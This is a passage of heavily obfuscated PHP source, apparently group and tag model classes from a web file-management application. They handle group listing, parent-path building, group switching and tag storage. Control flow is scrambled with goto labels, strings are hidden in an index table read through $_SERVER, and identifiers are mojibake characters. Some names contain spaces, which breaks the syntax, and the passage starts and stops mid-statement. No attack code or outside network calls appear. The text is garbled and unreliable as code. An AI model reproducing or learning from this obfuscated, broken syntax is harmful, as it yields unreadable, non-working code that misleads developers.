=& $_SERVER[Öíæ€“”≠éÏË]; $b˘©¨‡ØÖÎ = strtolower($b˘©¨‡ØÖÎ); $B¨¢¨‡Ÿ°ª = array($bÿÂøÿíò[93] => $a∑‹À¿å, $bÿÂøÿíò[372] => array($bÿÂøÿíò[380], "\45{$b˘©¨‡ØÖÎ}\x25")); goto BëπÍ’˘¢◊; c÷ﬂ∑Ö´ é: } protected function _listDataApplyItem($CìÎ‡âƒˆ∏) { $Aﬂ£ú’¢´ì = array($CìÎ‡âƒˆ∏); $this->_listDataApply($Aﬂ£ú’¢´ì); return $Aﬂ£ú’¢´ì[0]; } protected function _listDataApply(&$f˘·Ù≥œ˜ê) { goto FÙÌ£èË≈Ú; FÙÌ£èË≈Ú: $EñÖ·Ëïäﬂ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$f˘·Ù≥œ˜ê) { return; } $EÆÂâ·Â™ﬂ = array_to_keyvalue($f˘·Ù≥œ˜ê, $EñÖ·Ëïäﬂ[33], $EñÖ·Ëïäﬂ[1707]); goto Aâòáì¢¢Ü; Aâòáì¢¢Ü: $this->_listAppendChildren($f˘·Ù≥œ˜ê); $this->_listAppendChildrenMember($f˘·Ù≥œ˜ê); $this->_listAppendMeta($f˘·Ù≥œ˜ê, $EÆÂâ·Â™ﬂ); goto b‡ªœ’„ª§; b‡ªœ’„ª§: $this->_listAppendParent($f˘·Ù≥œ˜ê); $this->_listAppendSourceRoot($f˘·Ù≥œ˜ê, $EÆÂâ·Â™ﬂ); goto D¿åÆÉ≤ãŸ; D¿åÆÉ≤ãŸ: } private function _listAppendChildren(&$DËÏ‹øˆ±Ë) { goto fıÁéÀª“√; F›¨§è¯∂”: $a°Ì£¨¿Ö€ = array($AÜîÈ€ØÓ©[479], $AÜîÈ€ØÓ©[1801] => $AÜîÈ€ØÓ©[481]); $D¿É◊ôÍ◊Â = $this->field($a°Ì£¨¿Ö€)->where($e◊ﬁµüœÕÖ)->group($AÜîÈ€ØÓ©[479])->select(); $b™‡∆õ∞§á = array_to_keyvalue($D¿É◊ôÍ◊Â, $AÜîÈ€ØÓ©[479], $AÜîÈ€ØÓ©[481]); goto AÍ¥ä Ó©–; fıÁéÀª“√: $AÜîÈ€ØÓ© =& $_SERVER[Öíæ€“”≠éÏË]; $BµÙ∞ïı ÷ = array_to_keyvalue($DËÏ‹øˆ±Ë, $AÜîÈ€ØÓ©[33], $AÜîÈ€ØÓ©[1707]); $e◊ﬁµüœÕÖ = array($AÜîÈ€ØÓ©[479] => array($AÜîÈ€ØÓ©[7], $BµÙ∞ïı ÷)); goto F›¨§è¯∂”; AÍ¥ä Ó©–: foreach ($DËÏ‹øˆ±Ë as &$Fì¯≠èªÌñ) { $fÍÆÓÉÂ÷‡ = $Fì¯≠èªÌñ[$AÜîÈ€ØÓ©[1707]]; $Fì¯≠èªÌñ[$AÜîÈ€ØÓ©[1802]] = isset($b™‡∆õ∞§á[$fÍÆÓÉÂ÷‡]) ? intval($b™‡∆õ∞§á[$fÍÆÓÉÂ÷‡]) : !1; } unset($Fì¯≠èªÌñ); goto a≈öµå“òı; a≈öµå“òı: } private function _listAppendChildrenMember(&$AæÙ…õºôê) { goto F‰ùâ ﬂˆ’; cöªëÖº©ï: foreach ($AæÙ…õºôê as &$FÑ…êΩ˜ΩÀ) { $BÒàÜÍÉáæ = $FÑ…êΩ˜ΩÀ[$Fäµâ¥ÉêÀ[1707]]; $FÑ…êΩ˜ΩÀ[$Fäµâ¥ÉêÀ[1803]] = isset($C Ò∑’›¶¬[$BÒàÜÍÉáæ]) ? intval($C Ò∑’›¶¬[$BÒàÜÍÉáæ]) : !1; } unset($FÑ…êΩ˜ΩÀ); goto fÇáòá—Ñí; F‰ùâ ﬂˆ’: $Fäµâ¥ÉêÀ =& $_SERVER[Öíæ€“”≠éÏË]; $aäÇœµâµ™ = array_to_keyvalue($AæÙ…õºôê, $Fäµâ¥ÉêÀ[33], $Fäµâ¥ÉêÀ[1707]); $f∆⁄âÀî¨Ü = array($Fäµâ¥ÉêÀ[1707] => array($Fäµâ¥ÉêÀ[7], $aäÇœµâµ™)); goto EÇ‘Ç„°◊•; EÇ‘Ç„°◊•: $cÎûùã≥¯Á = array($Fäµâ¥ÉêÀ[1707], $Fäµâ¥ÉêÀ[1801] => $Fäµâ¥ÉêÀ[481]); $bà÷ŒÍ˘çã = Model($Fäµâ¥ÉêÀ[1793])->field($cÎûùã≥¯Á)->where($f∆⁄âÀî¨Ü)->group($Fäµâ¥ÉêÀ[1707])->select(); $C Ò∑’›¶¬ = array_to_keyvalue($bà÷ŒÍ˘çã, $Fäµâ¥ÉêÀ[1707], $Fäµâ¥ÉêÀ[481]); goto cöªëÖº©ï; fÇáòá—Ñí: } private function _listAppendMeta(&$cŸ‘ı…æ ¥, $dãÑ°±ü’ï) { goto Dºè˜ﬁõƒ©; dëÍåéÈ∆∆: foreach ($cŸ‘ı…æ ¥ as &$aË≤äãäÓ¶) { $aË≤äãäÓ¶[$Cçíﬂ∂¿ÈÌ[446]] = array(); if (isset($cÉ¯»∆à”¢[$aË≤äãäÓ¶[$Cçíﬂ∂¿ÈÌ[1707]]])) { $aË≤äãäÓ¶[$Cçíﬂ∂¿ÈÌ[446]] = $cÉ¯»∆à”¢[$aË≤äãäÓ¶[$Cçíﬂ∂¿ÈÌ[1707]]]; } } unset($aË≤äãäÓ¶); goto bö´áÏÖ“Î; fù©å√ΩÊ˜: $cÉ¯»∆à”¢ = array_to_keyvalue_group($cÉ¯»∆à”¢, $Cçíﬂ∂¿ÈÌ[1707]); foreach ($cÉ¯»∆à”¢ as &$eı◊ªÃ≥œ) { $eı◊ªÃ≥œ = array_to_keyvalue($eı◊ªÃ≥œ, $Cçíﬂ∂¿ÈÌ[93], $Cçíﬂ∂¿ÈÌ[372]); } unset($eı◊ªÃ≥œ); goto dëÍåéÈ∆∆; Dºè˜ﬁõƒ©: $Cçíﬂ∂¿ÈÌ =& $_SERVER[Öíæ€“”≠éÏË]; $fÒ⁄µæËê„ = array($Cçíﬂ∂¿ÈÌ[1707] => array($Cçíﬂ∂¿ÈÌ[7], $dãÑ°±ü’ï)); $cÉ¯»∆à”¢ = Model($Cçíﬂ∂¿ÈÌ[1792])->where($fÒ⁄µæËê„)->select(); goto fù©å√ΩÊ˜; bö´áÏÖ“Î: } protected function parentLevelArray($fÑû¢Â´º”) { $d⁄õ∆ùáüÌ =& $_SERVER[Öíæ€“”≠éÏË]; $fÑû¢Â´º” = explode($d⁄õ∆ùáüÌ[47], trim($fÑû¢Â´º”, $d⁄õ∆ùáüÌ[47])); $fÑû¢Â´º” = array_remove_value($fÑû¢Â´º”, $d⁄õ∆ùáüÌ[191]); return $fÑû¢Â´º”; } private function _listAppendParent(&$eÈÎø∑«Ãú) { goto FÂûÈ¡†õç; B¯∫âøëçÏ: unset($C®¬œÆﬂ…û); foreach ($eŸåòåˆËƒ as $aùÜÓÌèç∂ => $FˆÕüñÃï¢) { if ($FˆÕüñÃï¢) { continue; } $e∏ëÏ≈»ùÿ = $this->getInfoSimple($aùÜÓÌèç∂); $eŸåòåˆËƒ[$aùÜÓÌèç∂] = $e∏ëÏ≈»ùÿ[$DÆå¡øá√Ô[28]]; } $E‚‚ÀÁ…Ë¿ = $GLOBALS[$DÆå¡øá√Ô[6]][$DÆå¡øá√Ô[88]][$DÆå¡øá√Ô[1804]]; goto Cªáä¢µò´; Cªáä¢µò´: if ($GLOBALS[$DÆå¡øá√Ô[486]] == $DÆå¡øá√Ô[87]) { $E‚‚ÀÁ…Ë¿ = !1; } foreach ($eÈÎø∑«Ãú as &$C®¬œÆﬂ…û) { $DõÒ—≈ºÊ™ = $this->parentLevelArray($C®¬œÆﬂ…û[$DÆå¡øá√Ô[503]]); $F£ÑËﬂˆÙ = $DÆå¡øá√Ô[33]; foreach ($DõÒ—≈ºÊ™ as $aùÜÓÌèç∂ => $e¯ﬁáı≤°Ã) { if ($E‚‚ÀÁ…Ë¿ && $aùÜÓÌèç∂ == 0) { continue; } $F£ÑËﬂˆÙ .= $eŸåòåˆËƒ[$e¯ﬁáı≤°Ã] . $DÆå¡øá√Ô[8]; } if ($DõÒ—≈ºÊ™) { $F£ÑËﬂˆÙ .= $C®¬œÆﬂ…û[$DÆå¡øá√Ô[28]]; } $C®¬œÆﬂ…û[$DÆå¡øá√Ô[508]] = str_replace($DÆå¡øá√Ô[511], $DÆå¡øá√Ô[8], $F£ÑËﬂˆÙ); } unset($C®¬œÆﬂ…û); goto F±∞Ô◊ ¢Ç; FÂûÈ¡†õç: $DÆå¡øá√Ô =& $_SERVER[Öíæ€“”≠éÏË]; $eŸåòåˆËƒ = array(); foreach ($eÈÎø∑«Ãú as &$C®¬œÆﬂ…û) { $eŸåòåˆËƒ[$C®¬œÆﬂ…û[$DÆå¡øá√Ô[1707]]] = $C®¬œÆﬂ…û[$DÆå¡øá√Ô[28]]; $DõÒ—≈ºÊ™ = $this->parentLevelArray($C®¬œÆﬂ…û[$DÆå¡øá√Ô[503]]); foreach ($DõÒ—≈ºÊ™ as $e¯ﬁáı≤°Ã) { if (!isset($eŸåòåˆËƒ[$e¯ﬁáı≤°Ã])) { $eŸåòåˆËƒ[$e¯ﬁáı≤°Ã] = 0; } } } goto B¯∫âøëçÏ; F±∞Ô◊ ¢Ç: } private function _listAppendSourceRoot(&$B„‚ø…Àîÿ, $d ÎîŒ«ÜØ) { goto FêçåÓóÛÖ; D ª◊∫›Â∫: $bäπÈà¯õî = $b¯ÏÕΩÜ›≈->limit(count($d ÎîŒ«ÜØ))->where($FÌäøÂ¶–Ø)->select(); $bäπÈà¯õî = array_to_keyvalue($bäπÈà¯õî, $d±·â¥´ù◊[485]); $bäπÈà¯õî = array_remove_key($bäπÈà¯õî, $d±·â¥´ù◊[485]); goto f¯§õî⁄«; FêçåÓóÛÖ: $d±·â¥´ù◊ =& $_SERVER[Öíæ€“”≠éÏË]; $FÌäøÂ¶–Ø = array($d±·â¥´ù◊[479] => 0, $d±·â¥´ù◊[485] => array($d±·â¥´ù◊[7], $d ÎîŒ«ÜØ), $d±·â¥´ù◊[405] => SourceModel::TYPE_GROUP); $b¯ÏÕΩÜ›≈ = Model($d±·â¥´ù◊[803])->order($d±·â¥´ù◊[1805])->field($d±·â¥´ù◊[1806]); goto D ª◊∫›Â∫; f¯§õî⁄«: foreach ($B„‚ø…Àîÿ as &$FùÇÓı¨∂Ω) { $FùÇÓı¨∂Ω[$d±·â¥´ù◊[85]] = $bäπÈà¯õî[$FùÇÓı¨∂Ω[$d±·â¥´ù◊[1707]]] ? $bäπÈà¯õî[$FùÇÓı¨∂Ω[$d±·â¥´ù◊[1707]]] : array(); } unset($FùÇÓı¨∂Ω); goto aÜ»Çää»Ë; aÜ»Çää»Ë: } protected function groupMerge($D”™Œ‡ÃíÑ) { $D”™Œ‡ÃíÑ = array_values(array_unique($D”™Œ‡ÃíÑ)); $f˘¯ ÓƒÓŒ = array(); for ($b≥üí™óÌ• = 0; $b≥üí™óÌ• < count($D”™Œ‡ÃíÑ); $b≥üí™óÌ•++) { $BÖ¯¯À–æÔ = !1; for ($DéìûºŒÊ– = 0; $DéìûºŒÊ– < count($D”™Œ‡ÃíÑ); $DéìûºŒÊ–++) { if ($b≥üí™óÌ• == $DéìûºŒÊ–) { continue; } if ($this->isParentOf($D”™Œ‡ÃíÑ[$DéìûºŒÊ–], $D”™Œ‡ÃíÑ[$b≥üí™óÌ•])) { $BÖ¯¯À–æÔ = !0; break; } } if (!$BÖ¯¯À–æÔ) { $f˘¯ ÓƒÓŒ[] = $D”™Œ‡ÃíÑ[$b≥üí™óÌ•]; } } return $f˘¯ ÓƒÓŒ; } protected function isParentOf($FÁäâ‹Ü´¶, $c˘ˆ§‹Ωâõ) { goto D£„û—¬üœ; E»ÏØà…Ú™: return !1; goto Cö≠˘”∑÷≠; CöƒÙõ´Ö≠: $AÁû∫»úÉò = $this->getInfoSimple($c˘ˆ§‹Ωâõ); $BˆÏÎ¢î“Ã = $C≤◊ÎπõÊÆ[$d¢”ŸåÆòÇ[503]] . $FÁäâ‹Ü´¶ . $d¢”ŸåÆòÇ[47]; if (substr($AÁû∫»úÉò[$d¢”ŸåÆòÇ[503]], 0, strlen($BˆÏÎ¢î“Ã)) == $BˆÏÎ¢î“Ã) { return !0; } goto E»ÏØà…Ú™; D£„û—¬üœ: $d¢”ŸåÆòÇ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$FÁäâ‹Ü´¶ || !$c˘ˆ§‹Ωâõ || $FÁäâ‹Ü´¶ == $c˘ˆ§‹Ωâõ) { return !1; } $C≤◊ÎπõÊÆ = $this->getInfoSimple($FÁäâ‹Ü´¶); goto CöƒÙõ´Ö≠; Cö≠˘”∑÷≠: } public function groupShowRoot($f”é≈≤ﬂ‚À, $cêÃ„Œ∆∑π = false) { goto C†¢…ê÷ÂÏ; Aè“–Ü»âÕ: return $dﬂáÕ†ÜÊ∏; goto C“Ü±±¥Çõ; e ÆßÕ‡¢ä: $fÜÁ·ø÷¯º = $this->parentLevelArray($Fœöê◊¨µÿ[$Fë≤¬È™îÑ[503]]); $dﬂáÕ†ÜÊ∏ = array($f”é≈≤ﬂ‚À); if (count($fÜÁ·ø÷¯º) == 0) { return $dﬂáÕ†ÜÊ∏; } goto A√ˆ–•Ò’Ö; C†¢…ê÷ÂÏ: $Fë≤¬È™îÑ =& $_SERVER[Öíæ€“”≠éÏË]; $Fœöê◊¨µÿ = $this->getInfo($f”é≈≤ﬂ‚À); if (!$Fœöê◊¨µÿ) { return array(); } goto e ÆßÕ‡¢ä; A√ˆ–•Ò’Ö: if ($cêÃ„Œ∆∑π && count($fÜÁ·ø÷¯º) == 1) { return $dﬂáÕ†ÜÊ∏; } if (!$Fœöê◊¨µÿ[$Fë≤¬È™îÑ[446]] || !isset($Fœöê◊¨µÿ[$Fë≤¬È™îÑ[446]][$Fë≤¬È™îÑ[1789]]) || $Fœöê◊¨µÿ[$Fë≤¬È™îÑ[446]][$Fë≤¬È™îÑ[1789]] == $Fë≤¬È™îÑ[1761]) { return $this->groupShowRoot($fÜÁ·ø÷¯º[count($fÜÁ·ø÷¯º) - 1], $cêÃ„Œ∆∑π); } if ($Fœöê◊¨µÿ[$Fë≤¬È™îÑ[446]][$Fë≤¬È™îÑ[1789]] == $Fë≤¬È™îÑ[355]) { $CÉŸÒ± ®å = explode($Fë≤¬È™îÑ[47], $Fœöê◊¨µÿ[$Fë≤¬È™îÑ[446]][$Fë≤¬È™îÑ[1790]]); if ($CÉŸÒ± ®å) { $dﬂáÕ†ÜÊ∏ = array_merge($dﬂáÕ†ÜÊ∏, $CÉŸÒ± ®å); } } goto Aè“–Ü»âÕ; C“Ü±±¥Çõ: } protected function resetParentLevel() { $E‚°¿©ÒñÊ =& $_SERVER[Öíæ€“”≠éÏË]; $Få»à‰ÊÓ® = $E‚°¿©ÒñÊ[1707]; $EŸóÀØ∆≥Â = $this->select(); $EŸóÀØ∆≥Â = array_to_keyvalue($EŸóÀØ∆≥Â, $Få»à‰ÊÓ®); foreach ($EŸóÀØ∆≥Â as $FÂ˜ø“±˜ˆ) { goto FÖÇõèƒñ‘; FÖÇõèƒñ‘: $C∑Û≈¶ã«≈ = $FÂ˜ø“±˜ˆ; $fõë¨Ç©“§ = array(); while ($C∑Û≈¶ã«≈[$E‚°¿©ÒñÊ[479]] != 0) { $fõë¨Ç©“§[] = $C∑Û≈¶ã«≈[$E‚°¿©ÒñÊ[479]]; $C∑Û≈¶ã«≈ = $EŸóÀØ∆≥Â[$C∑Û≈¶ã«≈[$E‚°¿©ÒñÊ[479]]]; } goto DôÙïë†èœ; DôÙïë†èœ: $fõë¨Ç©“§[] = 0; $fõë¨Ç©“§ = $E‚°¿©ÒñÊ[47] . implode($E‚°¿©ÒñÊ[47], array_reverse($fõë¨Ç©“§)) . $E‚°¿©ÒñÊ[47]; $this->setNamePinyin($FÂ˜ø“±˜ˆ[$Få»à‰ÊÓ®], $FÂ˜ø“±˜ˆ[$E‚°¿©ÒñÊ[28]]); goto eÎû¥Ù¨Í‚; eÎû¥Ù¨Í‚: $this->where(array($Få»à‰ÊÓ® => $FÂ˜ø“±˜ˆ[$Få»à‰ÊÓ®]))->save(array($E‚°¿©ÒñÊ[567] => $fõë¨Ç©“§)); goto e©é≈·Ãã…; e©é≈·Ãã…: } return $EŸóÀØ∆≥Â; } public function groupNameAuto($c“€±£ãäÍ, $DÔ¿ÔÈÙ»í) { $A¨åùè√ê™ =& $_SERVER[Öíæ€“”≠éÏË]; $Cñ¶Â›⁄¡˘ = $this->where(array($A¨åùè√ê™[395] => $c“€±£ãäÍ))->getField($A¨åùè√ê™[28], !0); if (!$Cñ¶Â›⁄¡˘ || !in_array($DÔ¿ÔÈÙ»í, $Cñ¶Â›⁄¡˘)) { return $DÔ¿ÔÈÙ»í; } for ($d˜ÉØùƒ•Ã = 1; $d˜ÉØùƒ•Ã <= count($Cñ¶Â›⁄¡˘) + 1; $d˜ÉØùƒ•Ã++) { $Cº¬è⁄ÏÆØ = $DÔ¿ÔÈÙ»í . "\50{$d˜ÉØùƒ•Ã}\x29"; if (!in_array($Cº¬è⁄ÏÆØ, $Cñ¶Â›⁄¡˘)) { return $Cº¬è⁄ÏÆØ; } } } public function groupSwitch($bÌÁπ±ÈëÀ, $EÇÉ∏âÍòÇ) { goto bö≤ÖØ¿‚ã; béçÁ«Ï∞é: $cªª÷ñÁ©ı = !empty($b¨∫í‡π‰ò[$bÌÁπ±ÈëÀ]) ? $b¨∫í‡π‰ò[$bÌÁπ±ÈëÀ] : !1; if ($cªª÷ñÁ©ı) { goto FŒ™¯ºŸæû; FŒ™¯ºŸæû: if (!$b¨∫í‡π‰ò[$EÇÉ∏âÍòÇ]) { $b¨∫í‡π‰ò[$EÇÉ∏âÍòÇ] = Model($b≠ÜΩãÛ≥ı[803])->groupRootAdd($EÇÉ∏âÍòÇ); } $E±ıûúﬂ≤ü = $b¨∫í‡π‰ò[$EÇÉ∏âÍòÇ]; $Dìã»æöˆå = array($b≠ÜΩãÛ≥ı[479] => $cªª÷ñÁ©ı); goto DÇﬂÈã‘Ç∑; Dß‘ê¥¥çƒ: $e´òﬁáêÎ≈ = array($b≠ÜΩãÛ≥ı[485] => $EÇÉ∏âÍòÇ); Model($b≠ÜΩãÛ≥ı[1810])->where($Dìã»æöˆå)->save($e´òﬁáêÎ≈); Model($b≠ÜΩãÛ≥ı[1811])->where($Dìã»æöˆå)->save($e´òﬁáêÎ≈); goto DÀë÷å©ú≈; DÇﬂÈã‘Ç∑: $b¨∫í‡π‰ò = Model($b≠ÜΩãÛ≥ı[803])->where($Dìã»æöˆå)->field($b≠ÜΩãÛ≥ı[1809])->select(); if (!$b¨∫í‡π‰ò) { $b¨∫í‡π‰ò = array(); } Model($b≠ÜΩãÛ≥ı[803])->moveClearAuth = !1; goto e∂÷±≈∏Ñç; e∂÷±≈∏Ñç: foreach ($b¨∫í‡π‰ò as $FÍÖü· çø) { $B¥Ù¯îùàÊ = $FÍÖü· çø[$b≠ÜΩãÛ≥ı[404]] == $b≠ÜΩãÛ≥ı[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($b≠ÜΩãÛ≥ı[803])->move($FÍÖü· çø[$b≠ÜΩãÛ≥ı[396]], $E±ıûúﬂ≤ü, $B¥Ù¯îùàÊ); } Model($b≠ÜΩãÛ≥ı[803])->moveClearAuth = !0; $Dìã»æöˆå = array($b≠ÜΩãÛ≥ı[405] => 2, $b≠ÜΩãÛ≥ı[485] => $bÌÁπ±ÈëÀ); goto Dß‘ê¥¥çƒ; DÀë÷å©ú≈: } $this->_changeChildLevel($bÇØ•Ñﬁ“™[$bÌÁπ±ÈëÀ], $bÇØ•Ñﬁ“™[$EÇÉ∏âÍòÇ], !0); goto eÛ—§ÔÛîÙ; eÛ—§ÔÛîÙ: $this->where(array($b≠ÜΩãÛ≥ı[479] => $bÌÁπ±ÈëÀ))->save(array($b≠ÜΩãÛ≥ı[479] => $EÇÉ∏âÍòÇ)); $this->_clearChildrenCache($bÇØ•Ñﬁ“™[$EÇÉ∏âÍòÇ]); return !0; goto Dª⁄∏∏∂∑õ; e’Í•÷±é’: $c∂Üú€«ïü = Model($b≠ÜΩãÛ≥ı[1793])->where($Dìã»æöˆå)->select(); if (!$c∂Üú€«ïü) { $c∂Üú€«ïü = array(); } foreach ($c∂Üú€«ïü as $DŒüÖÑêÂö) { $f«ÒÏß—÷· = $DŒüÖÑêÂö[$b≠ÜΩãÛ≥ı[1538]]; $Dìã»æöˆå = array($b≠ÜΩãÛ≥ı[1538] => $f«ÒÏß—÷·, $b≠ÜΩãÛ≥ı[1707] => $EÇÉ∏âÍòÇ); $e§Ò¨“éÇû = Model($b≠ÜΩãÛ≥ı[1793])->where($Dìã»æöˆå)->find(); if (!$e§Ò¨“éÇû) { $EÑ»ÈÉ–∆ó = array($EÇÉ∏âÍòÇ => $DŒüÖÑêÂö[$b≠ÜΩãÛ≥ı[1807]]); Model($b≠ÜΩãÛ≥ı[520])->userGroupAdd($f«ÒÏß—÷·, $EÑ»ÈÉ–∆ó); } Model($b≠ÜΩãÛ≥ı[520])->userGroupRemove($f«ÒÏß—÷·, $bÌÁπ±ÈëÀ); } goto B¨‡®åè¢”; B¨‡®åè¢”: $Dìã»æöˆå = array($b≠ÜΩãÛ≥ı[405] => 2, $b≠ÜΩãÛ≥ı[479] => 0, $b≠ÜΩãÛ≥ı[404] => 1, $b≠ÜΩãÛ≥ı[485] => array($b≠ÜΩãÛ≥ı[7], array($bÌÁπ±ÈëÀ, $EÇÉ∏âÍòÇ))); $b¨∫í‡π‰ò = Model($b≠ÜΩãÛ≥ı[803])->where($Dìã»æöˆå)->field($b≠ÜΩãÛ≥ı[1808])->select(); $b¨∫í‡π‰ò = array_to_keyvalue($b¨∫í‡π‰ò, $b≠ÜΩãÛ≥ı[485], $b≠ÜΩãÛ≥ı[396]); goto béçÁ«Ï∞é; a¿è§ë«ﬁ‹: $bÇØ•Ñﬁ“™ = array_to_keyvalue($bÇØ•Ñﬁ“™, $b≠ÜΩãÛ≥ı[1707]); if (!isset($bÇØ•Ñﬁ“™[$bÌÁπ±ÈëÀ]) || !isset($bÇØ•Ñﬁ“™[$EÇÉ∏âÍòÇ]) || $bÇØ•Ñﬁ“™[$bÌÁπ±ÈëÀ][$b≠ÜΩãÛ≥ı[479]] == 0) { return !1; } $Dìã»æöˆå = array($b≠ÜΩãÛ≥ı[1707] => $bÌÁπ±ÈëÀ); goto e’Í•÷±é’; bö≤ÖØ¿‚ã: $b≠ÜΩãÛ≥ı =& $_SERVER[Öíæ€“”≠éÏË]; $Dìã»æöˆå = array($b≠ÜΩãÛ≥ı[1707] => array($b≠ÜΩãÛ≥ı[7], array($bÌÁπ±ÈëÀ, $EÇÉ∏âÍòÇ))); $bÇØ•Ñﬁ“™ = $this->where($Dìã»æöˆå)->select(); goto a¿è§ë«ﬁ‹; Dª⁄∏∏∂∑õ: } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($cÉùÉ˜°Õ») { $fôÈÒØê‹À =& $_SERVER[Öíæ€“”≠éÏË]; return array($fôÈÒØê‹À[1812] => array($cÉùÉ˜°Õ»[0], $fôÈÒØê‹À[1813]), $fôÈÒØê‹À[1814] => array($cÉùÉ˜°Õ»[0], $fôÈÒØê‹À[1815])); } protected function get($f≤íÛÿéê«) { $aùÕ€∏ì·Ñ =& $_SERVER[Öíæ€“”≠éÏË]; $dïã£è≈Ç≥ = Model($aùÕ€∏ì·Ñ[504])->metaGet($f≤íÛÿéê«, $aùÕ€∏ì·Ñ[1816]); $BÛ¨çø¶ÊÑ = json_decode($dïã£è≈Ç≥, !0); return $BÛ¨çø¶ÊÑ ? $BÛ¨çø¶ÊÑ : array($aùÕ€∏ì·Ñ[1817] => $aùÕ€∏ì·Ñ[87], $aùÕ€∏ì·Ñ[367] => array()); } protected function set($AÊà¡›»Ëô, $cç¯°Õ–î–) { $Dﬁ£µƒÛò =& $_SERVER[Öíæ€“”≠éÏË]; $cç¯°Õ–î– = $cç¯°Õ–î– ? $cç¯°Õ–î– : array($Dﬁ£µƒÛò[1817] => $Dﬁ£µƒÛò[87], $Dﬁ£µƒÛò[367] => array()); Model($Dﬁ£µƒÛò[504])->metaSet($AÊà¡›»Ëô, $Dﬁ£µƒÛò[1816], json_encode($cç¯°Õ–î–)); return Model($Dﬁ£µƒÛò[504])->metaSet($AÊà¡›»Ëô, $Dﬁ£µƒÛò[1816], json_encode($cç¯°Õ–î–)); } protected function getByTagID($dÈ”èó®Ö¡, $B⁄∆¨æ“Ëπ) { goto d‰ÙÌ∆∏Õå; F©®–⁄Î–ƒ: return is_array($fäÂË∫º·è) ? $fäÂË∫º·è : !1; goto F‚∆ÉÌçíÜ; bÉÓùø≈í–: $c¯”ÆÿÔÊ≥ = $this->get($dÈ”èó®Ö¡); if (!$c¯”ÆÿÔÊ≥ || !isset($c¯”ÆÿÔÊ≥[$eΩâ© ÖÒß[367]])) { return !1; } $fäÂË∫º·è = array_find_by_field($c¯”ÆÿÔÊ≥[$eΩâ© ÖÒß[367]], $eΩâ© ÖÒß[394], $B⁄∆¨æ“Ëπ); goto F©®–⁄Î–ƒ; d‰ÙÌ∆∏Õå: $eΩâ© ÖÒß =& $_SERVER[Öíæ€“”≠éÏË]; if (!$dÈ”èó®Ö¡ || !$B⁄∆¨æ“Ëπ) { return !1; } if (!Model($eΩâ© ÖÒß[504])->getInfoSimple($dÈ”èó®Ö¡)) { return !1; } goto bÉÓùø≈í–; F‚∆ÉÌçíÜ: } public function listSource($Bç£≠˜÷Á§, $D¡∆ëú‰©·) { goto aàéñáêıø; fñçﬁñ€ÿ‘: foreach ($AÃ·ÎóåÔ˘ as $f åµ«’—À => $D∫Ôª¨áµæ) { $e∞Òã¢“µπ = !0; if (!$D¡∆ëú‰©·) { $eü≥ ≥Àø¡[] = $f åµ«’—À; continue; } foreach ($D¡∆ëú‰©· as $b°íòù–±Ì) { if (!in_array($b°íòù–±Ì, $D∫Ôª¨áµæ)) { $e∞Òã¢“µπ = !1; break; } } if ($e∞Òã¢“µπ) { $eü≥ ≥Àø¡[] = $f åµ«’—À; } } if (!$eü≥ ≥Àø¡) { return array(); } $dû◊Ù‘ôî© = array($Bç÷ùÀÒÒÉ[411] => array($Bç÷ùÀÒÒÉ[412], $eü≥ ≥Àø¡), $Bç÷ùÀÒÒÉ[485] => $Bç£≠˜÷Á§, $Bç÷ùÀÒÒÉ[405] => SourceModel::TYPE_GROUP); goto f…√ÂÎÆêﬂ; f…√ÂÎÆêﬂ: $e§£öÃÆŸÒ = Model($Bç÷ùÀÒÒÉ[1215])->listSource($dû◊Ù‘ôî©); if (!$e§£öÃÆŸÒ || count($eü≥ ≥Àø¡) == $e§£öÃÆŸÒ[$Bç÷ùÀÒÒÉ[364]][$Bç÷ùÀÒÒÉ[365]]) { return $e§£öÃÆŸÒ; } $bíã®ÿ≥‘— = array(); goto BÊÀ–«“Üµ; aàéñáêıø: $Bç÷ùÀÒÒÉ =& $_SERVER[Öíæ€“”≠éÏË]; if ($D¡∆ëú‰©· && !is_array($D¡∆ëú‰©·)) { $D¡∆ëú‰©· = array($D¡∆ëú‰©·); } $f·‰…¬†≤· = $this->listData($Bç£≠˜÷Á§); goto f÷¡Ÿ≤Ü„·; C€ˆ¯ûåÍ•: foreach ($eü≥ ≥Àø¡ as $DùÓü∫¬•Õ) { if (!in_array($DùÓü∫¬•Õ, $fÑ“Ú£¶±é)) { $bíã®ÿ≥‘—[] = $DùÓü∫¬•Õ; } } if ($bíã®ÿ≥‘—) { $this->removeBySource($Bç£≠˜÷Á§, $bíã®ÿ≥‘—); } return $e§£öÃÆŸÒ; goto C±Œˆ◊íª‡; f÷¡Ÿ≤Ü„·: $AÃ·ÎóåÔ˘ = array(); foreach ($f·‰…¬†≤· as $D®îäË â) { $DùÓü∫¬•Õ = $D®îäË â[$Bç÷ùÀÒÒÉ[76]]; if (!$DùÓü∫¬•Õ) { continue; } if (!isset($AÃ·ÎóåÔ˘[$DùÓü∫¬•Õ])) { $AÃ·ÎóåÔ˘[$DùÓü∫¬•Õ] = array(); } $AÃ·ÎóåÔ˘[$DùÓü∫¬•Õ][] = $D®îäË â[$Bç÷ùÀÒÒÉ[420]]; } $eü≥ ≥Àø¡ = array(); goto fñçﬁñ€ÿ‘; BÊÀ–«“Üµ: $aË‡ñîàå⁄ = array_to_keyvalue($e§£öÃÆŸÒ[$Bç÷ùÀÒÒÉ[75]], $Bç÷ùÀÒÒÉ[33], $Bç÷ùÀÒÒÉ[396]); $eÉ”à«⁄Ö∏ = array_to_keyvalue($e§£öÃÆŸÒ[$Bç÷ùÀÒÒÉ[74]], $Bç÷ùÀÒÒÉ[33], $Bç÷ùÀÒÒÉ[396]); $fÑ“Ú£¶±é = array_merge($eÉ”à«⁄Ö∏, $aË‡ñîàå⁄); goto C€ˆ¯ûåÍ•; C±Œˆ◊íª‡: } protected function listData($d¬´·æäò) { $e„å·çÚê¯ =& $_SERVER[Öíæ€“”≠éÏË]; $B§≤ó¥åÛÆ = array($e„å·çÚê¯[1529] => 0, $e„å·çÚê¯[464] => array($e„å·çÚê¯[1818], 0), $e„å·çÚê¯[416] => $e„å·çÚê¯[1819] . $d¬´·æäò); $c«∏≤„·¯˘ = $e„å·çÚê¯[1820]; $aï´µîàèË = $this->field($c«∏≤„·¯˘)->where($B§≤ó¥åÛÆ)->order($e„å·çÚê¯[1821])->select(); return $aï´µîàèË ? $aï´µîàèË : array(); } protected function addToTag($b±∑◊⁄Ñé”, $F«£åàÇï», 